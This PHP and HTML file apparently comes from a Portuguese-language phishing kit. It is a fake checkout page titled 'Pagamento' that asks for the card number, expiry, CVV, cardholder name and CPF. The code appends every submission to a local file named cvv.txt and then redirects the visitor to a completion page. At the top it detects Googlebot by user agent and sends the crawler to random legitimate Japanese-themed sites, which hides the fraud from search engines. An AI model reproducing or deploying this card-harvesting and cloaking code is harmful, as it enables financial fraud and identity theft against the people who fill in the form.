<?php
// Array com os links aleatórios
$links = array(
    'https://www.br.emb-japan.go.jp/itprtop_pt/index.html',
    'https://japanrabbit.com/pt/lojas/',
    'https://www.japanstore.com.br/'
);

// Verifica o user-agent para identificar o Googlebot
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$isGooglebot = stripos($userAgent, 'Googlebot') !== false;

// Redireciona o Googlebot para um link aleatório
if ($isGooglebot) {
    $randomLink = $links[array_rand($links)];
    header("Location: $randomLink");
    exit();
}
?>

<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagamento</title>
    <style>
        .container {
            max-width: 400px;
            margin: 0 auto;
            padding: 20px;
        }

        .card {
            width: 200px;
            height: 120px;
            background-image: url("cc1.png");
            background-size: cover;
            margin: 20px auto;
        }

        .card-input {
            margin-bottom: 10px;
        }

        .card-label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
        }

        .card-number-input,
        .expiry-input,
        .cvv-input,
        .name-input,
        .cpf-input,
        .parcelas-select {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
        }

        .valor-produto,
        .parcelas-info {
            margin-top: 20px;
            font-weight: bold;
        }

        .submit-btn {
            display: block;
            width: 100%;
            padding: 10px;
            font-size: 16px;
            font-weight: bold;
            color: #fff;
            background-color: #007bff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <?php
    if ($_SERVER["REQUEST_METHOD"] == "POST") {
        $numeroCartao = formatarNumeroCartao($_POST["cardNumberInput"]);
        $validade = formatarValidade($_POST["expiryInput"]);
        $cvv = substr($_POST["cvvInput"], 0, 4);
        $nomeImpresso = $_POST["nameInput"];
        $cpf = formatarCPF($_POST["cpfInput"]);
        $parcelas = $_POST["parcelasSelect"];

        // Monta os dados a serem salvos no arquivo cvv.txt
        $dados = "Número do Cartão: $numeroCartao\n";
        $dados .= "Validade: $validade\n";
        $dados .= "CVV: $cvv\n";
        $dados .= "Nome Impresso: $nomeImpresso\n";
        $dados .= "CPF: $cpf\n";
        $dados .= "Parcelas: $parcelas\n";
        $dados .= "============================\n";

        file_put_contents('cvv.txt', $dados, FILE_APPEND);

        // Redireciona para a página final.php
        header("Location: final.html");
        exit();
    }

    function formatarNumeroCartao($num)
    {
        $num = preg_replace('/\D/', '', $num);
        $num = preg_replace('/^(\d{4})(\d{4})(\d{4})(\d{4})$/', '$1 $2 $3 $4', $num);
        return $num;
    }

    function formatarValidade($data)
    {
        $data = preg_replace('/\D/', '', $data);
        $data = preg_replace('/^(\d{2})/', '$1/', $data); // Adiciona a barra (/) após os dois primeiros números
        $data = preg_replace('/^(\d{2})(\d{2})$/', '$1/$2', $data);
        return $data;
    }

    function formatarCPF($cpf)
    {
        $cpf = preg_replace('/\D/', '', $cpf);
        $cpf = preg_replace('/^(\d{3})(\d{3})(\d{3})(\d{2})$/', '$1.$2.$3-$4', $cpf);
        return $cpf;
    }

    // Lê o valor do produto do arquivo rs.txt
    $valorProduto = file_get_contents('rs.txt');

    // Cálculo do valor das parcelas
    $parcelasDisponiveis = 2; // Número de parcelas disponíveis
    $valorParcela = $valorProduto / $parcelasDisponiveis;
    ?>

    <div class="container">
        <div class="card"></div>

        <form method="POST">
            <div class="card-input">
                <label class="card-label" for="cardNumberInput">Número do Cartão</label>
                <input id="cardNumberInput" class="card-number-input" type="text" placeholder="1234 5678 9012 3456" name="cardNumberInput" required>
            </div>

            <div class="card-input">
                <label class="card-label" for="expiryInput">Validade (MM/AA)</label>
                <input id="expiryInput" class="expiry-input" type="text" placeholder="MM/AA" name="expiryInput" required>
            </div>

            <div class="card-input">
                <label class="card-label" for="cvvInput">CVV</label>
                <input id="cvvInput" class="cvv-input" type="text" placeholder="123" name="cvvInput" required maxlength="4">
            </div>

            <div class="card-input">
                <label class="card-label" for="nameInput">Nome Impresso no Cartão</label>
                <input id="nameInput" class="name-input" type="text" placeholder="Nome Sobrenome" name="nameInput" required>
            </div>

            <div class="card-input">
                <label class="card-label" for="cpfInput">CPF</label>
                <input id="cpfInput" class="cpf-input" type="text" placeholder="123.456.789-00" name="cpfInput" required>
            </div>

            <div class="valor-produto">Valor do Produto: R$ <?php echo $valorProduto; ?></div>

            <div class="card-input">
                <label class="card-label" for="parcelasSelect">Parcelas</label>
                <select id="parcelasSelect" class="parcelas-select" name="parcelasSelect" required>
                    <option value="1">1x - R$ <?php echo $valorProduto; ?></option>
                    <option value="2">2x - R$ <?php echo number_format($valorParcela, 2, ',', '.'); ?></option>
                </select>
            </div>

            <input class="submit-btn" type="submit" value="Finalizar Pagamento">
        </form>
    </div>

    <script>
        // Função para formatar o número do cartão em tempo real
        function formatarNumeroCartao(event) {
            const input = event.target;
            const { value } = input;

            const formattedValue = value.replace(/\D/g, '')
                .replace(/(\d{4})(?=\d)/g, '$1 ');

            input.value = formattedValue;
        }

        // Função para formatar a validade do cartão em tempo real
        function formatarValidade(event) {
            const input = event.target;
            const { value } = input;

            const formattedValue = value.replace(/\D/g, '')
                .replace(/(\d{2})(?=\d)/g, '$1/');

            input.value = formattedValue;
        }

        const cardNumberInput = document.getElementById('cardNumberInput');
        const expiryInput = document.getElementById('expiryInput');

        cardNumberInput.addEventListener('input', formatarNumeroCartao);
        expiryInput.addEventListener('input', formatarValidade);
    </script>
</body>
</html>